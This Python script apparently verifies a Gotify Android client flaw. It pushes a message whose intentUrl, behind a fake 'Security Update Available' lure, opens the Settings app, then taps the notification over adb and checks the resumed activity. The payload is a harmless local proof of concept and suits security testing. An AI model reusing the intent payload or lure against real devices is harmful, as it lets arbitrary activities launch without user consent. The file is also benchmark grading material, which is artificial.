#!/usr/bin/env python3
"""
Gotify Intent URL Confirmation Bypass — Verification Helper

Checks whether the vulnerability allows arbitrary intents to be launched
when a notification is clicked, bypassing the confirmation dialog.

Two checks are performed:

1. SETTINGS LAUNCH CHECK — Sends a push message with an intentUrl that
   targets the Android Settings app via Intent.parseUri(). Then dismisses
   any foreground activity, opens the notification shade, clicks the Gotify
   notification, and checks `adb shell dumpsys activity activities` for the
   currently resumed activity. If com.android.settings is the resumed
   activity, the vulnerability is confirmed. This is unfakeable — dumpsys
   queries the OS activity manager directly, not app-writable logs.

2. MESSAGE CHECK — Queries the Gotify server for messages containing the
   exploit's intentUrl marker. This confirms the malicious push message
   was actually sent.

Both must be true: the exploit message was sent AND Settings was launched.

Exit codes:
    0 — NOT VULNERABLE: Settings was not launched
    1 — VULNERABLE: Settings app was launched via the intent
"""
import json
import os
import re
import subprocess
import sys
import time

import requests

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
GOTIFY_SERVER = "http://127.0.0.1:8080"
GOTIFY_USER = None  # Set from metadata.json
GOTIFY_PASS = None  # Set from metadata.json
PACKAGE = "com.github.gotify"

# The intent URL that launches Android Settings via Intent.parseUri().
# Uses explicit component so Intent.parseUri() creates a targeted intent.
SETTINGS_INTENT_URL = "intent:#Intent;component=com.android.settings/.Settings;end"

# Marker to find the exploit message on the server
EXPLOIT_CALLBACK_MARKER = "com.android.settings"

# Title used in the push message — used to find the notification in UI
NOTIFICATION_TITLE = "Security Update Available"


# ---------------------------------------------------------------------------
# ADB / UI helpers
# ---------------------------------------------------------------------------
def _adb(*args, timeout=15):
    """Run an adb command and return the CompletedProcess."""
    return subprocess.run(
        ["adb", *args],
        capture_output=True,
        text=True,
        timeout=timeout,
    )


def _press_home():
    """Press the HOME button to dismiss foreground activities."""
    _adb("shell", "input", "keyevent", "KEYCODE_HOME")
    time.sleep(1)


def _open_notification_shade():
    """Pull down the notification shade."""
    _adb("shell", "cmd", "statusbar", "expand-notifications")
    time.sleep(2)


def _close_notification_shade():
    """Close the notification shade."""
    _adb("shell", "cmd", "statusbar", "collapse")
    time.sleep(0.5)


def _click_notification():
    """Find and click the Gotify notification in the notification shade.

    Uses uiautomator dump to find the notification by title text,
    extracts its bounds, and taps the center of the notification.

    Returns True if the notification was found and clicked.
    """
    result = _adb("shell", "uiautomator", "dump", "/dev/stdout")
    if result.returncode != 0:
        print(f"[check_url] uiautomator dump failed: {result.stderr}")
        return False

    xml = result.stdout

    # Find the notification by its title text
    # Look for the text node and its parent's bounds
    pattern = r'bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"[^>]*text="[^"]*' + re.escape(
        NOTIFICATION_TITLE
    )
    match = re.search(pattern, xml)

    if not match:
        # Try reverse order — text before bounds
        pattern2 = (
            r'text="[^"]*'
            + re.escape(NOTIFICATION_TITLE)
            + r'[^"]*"[^>]*bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"'
        )
        match = re.search(pattern2, xml)

    if not match:
        # Last resort: find any node containing the title
        if NOTIFICATION_TITLE in xml:
            # Find the bounds nearest to the title in the XML
            title_pos = xml.find(NOTIFICATION_TITLE)
            # Search backwards for bounds
            bounds_pattern = r'bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"'
            for m in re.finditer(bounds_pattern, xml):
                if m.end() < title_pos + 200:
                    match = m
        if not match:
            print("[check_url] Could not find notification in UI")
            return False

    x1, y1, x2, y2 = (
        int(match.group(1)),
        int(match.group(2)),
        int(match.group(3)),
        int(match.group(4)),
    )
    cx, cy = (x1 + x2) // 2, (y1 + y2) // 2
    print(
        f"[check_url] Found notification at bounds [{x1},{y1}][{x2},{y2}], clicking ({cx},{cy})"
    )

    _adb("shell", "input", "tap", str(cx), str(cy))
    time.sleep(3)
    return True


def _get_resumed_activity():
    """Query dumpsys for the currently resumed activity.

    Checks for multiple possible field names across Android versions:
    - "ResumedActivity" (common on newer Android versions)
    - "topResumedActivity" (also seen on newer versions)
    - "mResumedActivity" (older Android versions)

    Returns the matching line content, or None if not found.
    """
    result = _adb("shell", "dumpsys", "activity", "activities")
    for line in result.stdout.split("\n"):
        stripped = line.strip()
        if stripped.startswith("ResumedActivity:") or stripped.startswith(
            "topResumedActivity="
        ):
            return stripped
        if "mResumedActivity" in stripped:
            return stripped
    return None


# ---------------------------------------------------------------------------
# Check 1: Trigger a Settings launch via notification click and verify
# ---------------------------------------------------------------------------
def _get_or_create_app_token():
    """Return an application token we can use to push messages."""
    resp = requests.get(
        f"{GOTIFY_SERVER}/application",
        auth=(GOTIFY_USER, GOTIFY_PASS),
        timeout=10,
    )
    if resp.ok:
        apps = resp.json()
        if apps:
            return apps[0]["token"]

    resp = requests.post(
        f"{GOTIFY_SERVER}/application",
        auth=(GOTIFY_USER, GOTIFY_PASS),
        json={
            "name": "VerifyApp",
            "description": "Temporary app for verification",
        },
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()["token"]


def _send_settings_intent_message(app_token):
    """Push a message whose intentUrl targets the Settings app."""
    payload = {
        "title": NOTIFICATION_TITLE,
        "message": "Tap to install the latest patch.",
        "priority": 5,
        "extras": {
            "android::action": {
                "onReceive": {
                    "intentUrl": SETTINGS_INTENT_URL,
                }
            }
        },
    }
    resp = requests.post(
        f"{GOTIFY_SERVER}/message",
        headers={"X-Gotify-Key": app_token},
        json=payload,
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()


def trigger_and_check_settings_launch():
    """Send a Settings intent via Gotify push, click notification, verify.

    1. Get/create an app token
    2. Send a push message with intentUrl = Settings intent
    3. Wait for the app to process the WebSocket message and create notification
    4. Press HOME to dismiss any foreground dialogs (e.g. IntentUrlDialogActivity)
    5. Open notification shade and click the Gotify notification
    6. Check dumpsys for the resumed activity

    On the VULNERABLE build, clicking the notification launches Settings
    directly (no confirmation dialog). On the CLEAN build, clicking the
    notification opens MessagesActivity (the confirmation dialog was already
    shown separately).

    Returns True if Settings is the currently resumed activity.
    """
    print("[check_url] --- Settings Launch Check ---")

    try:
        token = _get_or_create_app_token()
        print(f"[check_url] Obtained app token: {token[:8]}...")

        print("[check_url] Sending push message with Settings intentUrl...")
        msg = _send_settings_intent_message(token)
        print(f"[check_url] Message sent (id={msg.get('id')})")

        print("[check_url] Waiting 5 seconds for app to process message...")
        time.sleep(5)

        print("[check_url] Pressing HOME to dismiss any foreground dialogs...")
        _press_home()

        print("[check_url] Opening notification shade...")
        _open_notification_shade()

        print("[check_url] Clicking Gotify notification...")
        clicked = _click_notification()
        if not clicked:
            print("[check_url] Failed to click notification")
            return False

        print("[check_url] Waiting for activity to start...")
        time.sleep(2)

        resumed = _get_resumed_activity()
        if resumed:
            print(f"[check_url] Resumed activity: {resumed}")
        else:
            print("[check_url] Could not determine resumed activity")
            return False

        if "com.android.settings" in resumed:
            print("[check_url] Settings app is the resumed activity")
            return True
        else:
            print("[check_url] Settings app is NOT the resumed activity")
            return False

    except requests.exceptions.ConnectionError as e:
        print(
            f"[check_url] ERROR: Cannot connect to Gotify server: {e}",
            file=sys.stderr,
        )
        return False
    except Exception as e:
        print(f"[check_url] ERROR: {e}", file=sys.stderr)
        return False


# ---------------------------------------------------------------------------
# Check 2: Did the exploit send the malicious message?
# ---------------------------------------------------------------------------
def detect_exploit_message():
    """Check if the Gotify server has a message with the exploit's intentUrl.

    Queries the Gotify REST API for messages and looks for ones containing
    the exploit's callback URL marker.

    Returns True if an exploit message is found on the server.
    """
    print("[check_url] --- Message Check ---")

    try:
        resp = requests.get(
            f"{GOTIFY_SERVER}/message",
            auth=(GOTIFY_USER, GOTIFY_PASS),
            timeout=10,
        )
        if not resp.ok:
            print(
                f"[check_url] ERROR: Failed to query messages: {resp.status_code}",
                file=sys.stderr,
            )
            return False

        data = resp.json()
        messages = data.get("messages", [])
        print(f"[check_url] Found {len(messages)} message(s) on server")

        for msg in messages:
            extras = msg.get("extras", {})
            android_action = extras.get("android::action", {})
            on_receive = android_action.get("onReceive", {})
            intent_url = on_receive.get("intentUrl", "")

            if EXPLOIT_CALLBACK_MARKER in intent_url:
                print(
                    f"[check_url] Found exploit message (id={msg.get('id')}): "
                    f"intentUrl={intent_url}"
                )
                return True

        print(
            f"[check_url] No messages with '{EXPLOIT_CALLBACK_MARKER}' "
            "in intentUrl found"
        )
        return False

    except requests.exceptions.ConnectionError as e:
        print(
            f"[check_url] ERROR: Cannot connect to Gotify server: {e}",
            file=sys.stderr,
        )
        return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    global GOTIFY_USER, GOTIFY_PASS

    script_dir = os.path.dirname(os.path.abspath(__file__))
    metadata_path = os.path.join(script_dir, "../../../metadata.json")

    try:
        with open(metadata_path, "r") as f:
            metadata = json.load(f)
        GOTIFY_USER = metadata["username"]
        GOTIFY_PASS = metadata["password"]
    except (FileNotFoundError, KeyError) as e:
        print(f"[check_url] Error reading metadata.json: {e}", file=sys.stderr)
        sys.exit(1)

    # Check 1: Does clicking the notification launch Settings?
    settings_launched = trigger_and_check_settings_launch()

    # Check 2: Did the exploit send the malicious message?
    exploit_message_found = detect_exploit_message()

    # Report results
    print("[check_url] --- Results ---")
    print(f"[check_url] Settings app launched:         {settings_launched}")
    print(f"[check_url] Exploit message on server:     {exploit_message_found}")

    if settings_launched and exploit_message_found:
        print(
            "[check_url] VULNERABLE: exploit message was sent AND Settings "
            "app was launched via notification click (no confirmation dialog)"
        )
        sys.exit(1)
    elif exploit_message_found and not settings_launched:
        print(
            "[check_url] NOT VULNERABLE: exploit message exists but Settings "
            "did not launch (confirmation dialog blocked it)"
        )
        sys.exit(0)
    elif settings_launched and not exploit_message_found:
        print(
            "[check_url] NOT VULNERABLE: Settings launched but no exploit "
            "message found (possible manual launch)"
        )
        sys.exit(0)
    else:
        print(
            "[check_url] NOT VULNERABLE: no exploit message and no "
            "Settings launch detected"
        )
        sys.exit(0)


if __name__ == "__main__":
    main()
